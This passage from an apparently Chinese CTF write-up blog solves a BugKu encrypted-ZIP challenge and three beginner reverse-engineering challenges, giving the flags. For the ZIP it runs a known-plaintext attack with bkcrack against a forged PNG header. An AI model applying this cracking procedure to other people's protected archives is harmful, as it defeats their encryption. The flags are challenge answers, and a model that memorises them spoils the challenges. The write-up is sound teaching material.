file.read().decode(&quot;utf-8&quot;, &quot;ignore&quot;)# 通过正则匹配文件，形成元组。matches = pattern.findall(data)flag = [&#x27;&#x27;] * 31# 对于每个元组 t，使用 lambda 函数将其第一个元素（索引）转换为整数，并将其第二个元素（ASCII 码）转换为对应的字符。然后，通过 map() 函数对 matches 中的每个元组执行这个转换，得到一个由索引和对应字符组成的元组的迭代器。接着，使用 for 循环遍历这个迭代器中的每个元组。在循环中，index 变量存储索引值，value 变量存储对应的字符。for index, value in map(lambda t: (int(t[0]), chr(int(t[1]))), matches): flag[index] = value# 将flag拼接起来。print(&#x27;&#x27;.join(flag)) 即得Flag：flag&#123;w1reshARK_ez_1sntit&#125; 压缩包攻击BugKu-请攻击这个压缩包下载获取附件，是一个加密了的压缩包，除此之外没有任何提示： 解题思路： 暴力破解 伪加密 明文攻击 若是突破点为暴力破解，应有少量的提示，大概率不可能纯暴力破解，时间太长效率不高；可以利用010editor查看是否为伪加密： 如何判断真加密伪加密？ ​\tfrFlags 和 deFlags ​\t压缩源文件数据区中的全局方式位标记是判断压缩包有无伪加密的重要标志，即压缩源文件数据区的第7、第8两个字节09 00。 ​\tZIP的压缩源文件数据区全局方式位标记在010 Editor显示的文件结构中即为ushort frFlags。 ​\t压缩文件目录区的全局方式位标记是进行伪加密的关键，即压缩文件目录区的第9、第10两个字节。 ​\tZIP的压缩文件目录区全局方式位标记在010 Editor显示的文件结构中即为ushort deFlags。 ​\t无加密的ZIP： 压缩源文件数据区的全局方式位标记应当为00 00，且压缩源文件目录区的全局方式位标记应当为00 00 真加密的ZIP: 压缩源文件数据区的全局方式位标记应当为09 00，且压缩源文件目录区的全局方式位标记应当为09 00 伪加密的ZIP: 压缩源文件数据区的全局方式位标记应当为00 00，且压缩文件目录区的全局方式位标记应当为09 00。 可以确认是真加密，那接下来往明文攻击那方向思考，查询一下压缩包明文攻击的前置条件： 第一第二点，我们并不满足，但是第三种利用7z查看加密算法后，发现可以利用： 利用ZipCrypto Store的特性，只需要知道加密压缩包内容的12个字节就可以对该压缩包进行明文攻击破解，标准Png文件的文件头都是一致的，所以我们可以拟造一个只有文件头的Png文件；Png文件头：89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52 12echo 89504E470D0A1A0A0000000D49484452 | xxd -r -ps &gt; png_header# xxd -r -ps：将16进制数转换成ASCII文本 效果是这样的： 接下来使用bkcrack工具进行明文攻击，将加密的压缩包和刚刚拟造的png_header放在同一目录下： 1234567time bkcrack -C file.zip -c flag.png -p png_header -o 0 &gt; 1.log&amp;# time：加上time参数查看计算爆破时间# -C：选择加密压缩包# -c：选择压缩包的密文部分# -p：选择的明文文件# -o：指定的明文在压缩包内目标文件的偏移量# &gt; 1.log&amp;：后台运行，并将结果存入1.log 工具链接：https://github.com/kimci86/bkcrack 12# 使用以下命令查看进度 tail -f 1.log 可以获得三段密钥：92802c24 9955f8d6 65c652b8 利用这三段密钥即可把flag.png文件取出来： 1bkcrack -C file.zip -c flag.png -k 92802c24 9955f8d6 65c652b8 -d try.png 在同级目录下即可获得try.png： 打开图片即可获得Flag： 即得Flag：BugKu&#123;不是非得两个文件你才能明文攻击&#125; ReverseSWPUCTF 2021 新生赛-re1下载附件，是一个exe可执行文件： 二话不说直接拖进IDA中分析分析，拖进去后先查找main函数，然后F5反编译看看伪代码的逻辑： 主体代码逻辑如下： 12345678910111213141516171819strcpy(Str2, &quot;&#123;34sy_r3v3rs3&#125;&quot;); // 将目标字符串 &quot;&#123;34sy_r3v3rs3&#125;&quot; 复制到 Str2 数组中 printf(&quot;please put your flag:&quot;); // 打印提示消息，要求用户输入标志 scanf(&quot;%s&quot;, Str1); // 从用户输入中读取字符串，并存储到 Str1 数组中 for ( i = 0; i &lt;= 665; ++i ) // 循环遍历 Str1 中的每个字符，进行替换操作 &#123; if ( Str1[i] == 101 ) // 如果当前字符是 ASCII 值为 101 的 &#x27;e&#x27;，则将其替换为 ASCII 值为 51 的 &#x27;3&#x27; Str1[i] = 51; &#125; for ( i = 0; i &lt;= 665; ++i ) &#123; if ( Str1[i] == 97 ) // 如果当前字符是 ASCII 值为 97 的 &#x27;a&#x27;，则将其替换为 ASCII 值为 52 的 &#x27;4&#x27; Str1[i] = 52; &#125; if ( strcmp(Str1, Str2) ) // 比较 Str1 和 Str2 是否相等，若不相等则执行下一步操作 printf(&quot;you are wrong,see again!&quot;); else printf(&quot;you are right!&quot;); // 若相等则打印提示消息，表示输入正确 system(&quot;pause&quot;); return 0; 以上代码实现了一个替换字符的动作，用户输入的“Flag”经过上述转换后若是等于”{34sy_r3v3rs3}”则输入正确；也就是说只需要将得到”{34sy_r3v3rs3}”的动作逆转即可，逆转过程使用Python实现： 123456789101112str = &#x27;&#123;34sy_r3v3rs3&#125;&#x27;new_str = &#x27;&#x27; # 创建一个新的字符串来存储修改后的结果for i in str: if ord(i) == 51: new_str += chr(101) # 将字符 &#x27;3&#x27; 替换为字符 &#x27;e&#x27; elif ord(i) == 52: new_str += chr(97) # 将字符 &#x27;4&#x27; 替换为字符 &#x27;a&#x27; else: new_str += i # 如果不需要替换，则保留原字符print(new_str) 运行结果如下图： 对结果进行验证： 结果正确，题目摘抄于NSSCTF平台，即完整Flag为：NSSCTF&#123;easy_reverse&#125; HUBUCTF 2022 新生赛-simple_RE下载附件，是一个压缩包，里面有一个exe可执行文件： 拖进IDA进行分析，发现有一串字符串，先找到main函数： 按F5反编译分析伪代码的结构： 代码如下，丢去GPT协助分析一下，程序的大致逻辑是用户输入一个字符串，经过函数转换后与内置的另一个字符串进行比较，正确即显示success!： 12345678910111213141516171819int __fastcall main(int argc, const char **argv, const char **envp)&#123; int v4; // [rsp+24h] [rbp-44h] BYREF void *Buf1; // [rsp+28h] [rbp-40h] BYREF char v6[56]; // [rsp+30h] [rbp-38h] BYREF sub_401770(argc, argv, envp); printf(&quot;please input the flag:&quot;); scanf(&quot;%s&quot;, v6); Buf1 = 0i64; sub_401570(v6, &amp;Buf1, &amp;v4); if ( !memcmp(Buf1, a5mc58bphliax7j, v4) ) printf(&quot; success!&quot;); else printf(&quot; failed!&quot;); if ( Buf1 ) free(Buf1); return 0;&#125; &#x2F;&#x2F; int v4; &#x2F;&#x2F; [rsp+24h] [rbp-44h] BYREF：定义一个整型变量 v4，用于存储结果长度。 &#x2F;&#x2F; void *Buf1; &#x2F;&#x2F; [rsp+28h] [rbp-40h] BYREF：定义一个指针变量 Buf1，用于存储 Base64 编码后的结果。 &#x2F;&#x2F; char v6[56]; &#x2F;&#x2F; [rsp+30h] [rbp-38h] BYREF：定义一个字符数组 v6，用于存储用户输入的字符串，长度为 56 个字节。 &#x2F;&#x2F; sub_401770(argc, argv, envp);：调用子函数 sub_401770，并将 argc、argv 和 envp 作为参数传递进去。该函数的具体功能需要查看其定义。 &#x2F;&#x2F; printf(“please input the flag:”);：打印提示信息，要求用户输入标志。 &#x2F;&#x2F; scanf(“%s”, v6);：通过键盘输入获取用户输入的字符串，并存储在变量 v6 中。 &#x2F;&#x2F; Buf1 &#x3D; 0i64;：将指针变量 Buf1 初始化为 NULL，即空指针。 &#x2F;&#x2F; sub_401570(v6, &amp;Buf1, &amp;v4);：调用子函数 sub_401570，并将用户输入的字符串 v6、结果指针的地址 &amp;Buf1 和结果长度的地址 &amp;v4 作为参数传递进去。该函数的具体功能需要查看其定义。 &#x2F;&#x2F; if ( !memcmp(Buf1, a5mc58bphliax7j, v4) )：通过 memcmp 函数比较 Buf1 指向的内存区域和 a5mc58bphliax7j 指向的内存区域的前 v4 个字节是否相等。如果相等，则说明用户输入的标志是正确的。 &#x2F;&#x2F; printf(“ success!”);：打印成功信息。 &#x2F;&#x2F; else printf(“ failed!”);：如果用户输入的标志不正确，则打印失败信息。 &#x2F;&#x2F; if ( Buf1 ) free(Buf1);：释放动态分配的内存空间，避免内存泄漏。 &#x2F;&#x2F; return 0;：程序正常退出，并返回 0 表示成功。 从代码中可以看到，用户输入的字符串被函数sub_401570转换后被用来与a5mc58bphliax7j变量进行比较，点进a5mc58bphliax7j中查看为一串Base64的编码： 再看看函数sub_401570实现的是什么功能： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465__int64 __fastcall sub_401570(const char *a1, _QWORD *a2, int *a3)&#123; int v6; // r15d int v7; // r12d int v8; // r13d __int64 v9; // r14 _BYTE *v10; // rax _BYTE *v11; // r9 __int64 v12; // r8 char v13; // cl char v14; // r11 char v15; // r10 __int64 result; // rax v6 = strlen(a1); v7 = v6 % 3; if ( v6 % 3 ) &#123; v8 = 4 * (v6 / 3) + 4; v9 = v8; v10 = malloc(v8 + 1i64); v10[v8] = 0; if ( v6 &lt;= 0 ) goto LABEL_5; &#125; else &#123; v8 = 4 * (v6 / 3); v9 = v8; v10 = malloc(v8 + 1i64); v10[v8] = 0; if ( v6 &lt;= 0 ) goto LABEL_8; &#125; v11 = v10; v12 = 0i64; do &#123; v11 += 4; v13 = a1[v12]; *(v11 - 4) = aQvejafhmuyjbac[v13 &gt;&gt; 2]; v14 = a1[v12 + 1]; *(v11 - 3) = aQvejafhmuyjbac[(v14 &gt;&gt; 4) | (16 * v13) &amp; 0x30]; v15 = a1[v12 + 2]; v12 += 3i64; *(v11 - 2) = aQvejafhmuyjbac[(v15 &gt;&gt; 6) | (4 * v14) &amp; 0x3C]; *(v11 - 1) = aQvejafhmuyjbac[v15 &amp; 0x3F]; &#125; while ( v6 &gt; (int)v12 );LABEL_5: if ( v7 == 1 ) &#123; v10[v9 - 2] = 61; v10[v9 - 1] = 61; &#125; else if ( v7 == 2 ) &#123; v10[v9 - 1] = 61; &#125;LABEL_8: *a2 = v10; result = 0i64; *a3 = v8; return result;&#125; 丢进GPT内分析后知道这段代码实现的是一个Base64编码的过程，但是字母表更换了，使用了aQvejafhmuyjbac内的字母表： 这里附上Base64编码的原理： 将二进制数据分割成 6 位一组： 首先，将需要编码的二进制数据按照 6 位一组进行分割。 将每组 6 位转换成一个 Base64 字符： 对于每一组 6 位的二进制数据，将其转换成对应的 Base64 字符。Base64 字符集包含 64 个字符，通常包括 A-Z、a-z、0-9 这 62 个字符，以及两个额外的字符，通常是 “+” 和 “&#x2F;“，共计 64 个字符。 对不足 6 位的二进制数据进行填充： 如果最后一组的二进制数据不足 6 位，需要进行填充。通常使用字符 “&#x3D;” 来填充。 将所有的 Base64 字符串连接起来： 将每组转换后的 Base64 字符串连接起来，形成最终的 Base64 编码结果。 至此，整个程序的逻辑为：接受用户输入的字符串，然后通过自定义的字母表进行Base64编码，然后再与给定字符串进行比较，一样则成功，反之失败；则解题关键就是将给定的字符串通过自定义的字母表Base64解码即可： 或者通过脚本转换： 123456789101112131415161718import base64str1 = &#x27;5Mc58bPHLiAx7J8ocJIlaVUxaJvMcoYMaoPMaOfg15c475tscHfM/8==&#x27;string1 = &quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;print(base64.b64decode(str1.translate(str.maketrans(string1,string2))))# maketrans函数的作用是创建字符映射的转换表。# translate(table)函数的作用是根据参数 table 给出的表（包含 256 个字符）转换字符串的字符，table是通过 maketrans()方法转换而来。# 以上面的这个例子来说，即将字符串str1中的涉及string1的内容（部分也算）转换成string2中的内容，再通过默认的Base64方法解码。# 那么str1是如何计算出来的呢？为了更加方便理解以上代码，以下是str1的推导过程。import base64string1 = &quot;qvEJAfHmUYjBac+u8Ph5n9Od17FrICL/X0gVtM4Qk6T2z3wNSsyoebilxWKGZpRD&quot;string2 = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;flag = &#x27;NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125;&#x27;print(base64.b64encode(flag.encode(&#x27;utf-8&#x27;)).decode(&#x27;utf-8&#x27;).translate(str.maketrans(string2, string1)))# 结合以上两段代码，能更好的理解“base64.b64decode(str1.translate(str.maketrans(string1,string2)))”此段代码的工作原理。 最后将结果输入进程序验证是否正确，程序一闪而过，可看到success！的字样： 题目摘自NSSCTF平台，即Flag为：NSSCTF&#123;a8d4347722800e72e34e1aba3fe914ae&#125; HNCTF 2022 Week1-X0r下载附件，便于记录进行改名，为一个exe执行程序： 丢进PE查壳和其他信息： 无壳，64位，丢进64位IDA中分析，找到main函数，F5反编译分析伪代码： 代码如下： 123456789101112131415161718192021222324int __fastcall main(int argc, const char **argv, const char **envp)&#123; char Str[44]; // [rsp+20h] [rbp-30h] BYREF int i; // [rsp+4Ch] [rbp-4h] _main(); puts(&quot;please input your flag!&quot;); scanf(&quot;%s&quot;, Str); if ( strlen(Str) != 22 ) &#123; printf(&quot;strlen error!&quot;); exit(0); &#125; for ( i = 0; i &lt;= 21; ++i ) &#123; if ( arr[i] != (Str[i] ^ 0x34) + 900 ) &#123; printf(&quot;flag error!&quot;); exit(0); &#125; &#125; printf(&quot;you are right!&quot;); return 0;&#125; 代码主要有一个判断点，判断输入的字符串长度是否等于22；确认字符串长度无误后对输入的字符串进行遍历，让字符串里的每一个字符与0x34进行异或并+900，最后与arr数组里的字符比较，错误则输出错误信息。那解题的关键即在arr数组中，点进去看看内容： 结合前面的分析，思路已经很清晰了，只需要将arr数组中的数据逆向回去即可得到Flag，使用Python转换，脚本如下： 上图数据中的“h”代表十六进制的意思； “2 dup”则表示该数据重复两次的意思。 1234arr = [0x3FE,0x3EB,0x3EB,0x3FB,0x3E4,0x3F6,0x3D3,0x3D0,0x388,0x3CA,0x3EF,0x389,0x3CB,0x3EF,0x3CB,0x388,0x3EF,0x3D5,0x3D9,0x3CB,0x3D1,0x3CD]flag = &quot;&quot;for i in range(len(arr)): flag += chr((arr[i] - 900) ^ 0x34) 将arr中的数据先-900再与0x34异或即可获得Flag： 题目摘自NSSCTF平台，即Flag为：NSSCTF&#123;x0r_1s_s0_easy&#125;","tags":["CTF"],"categories":["CTF"]}]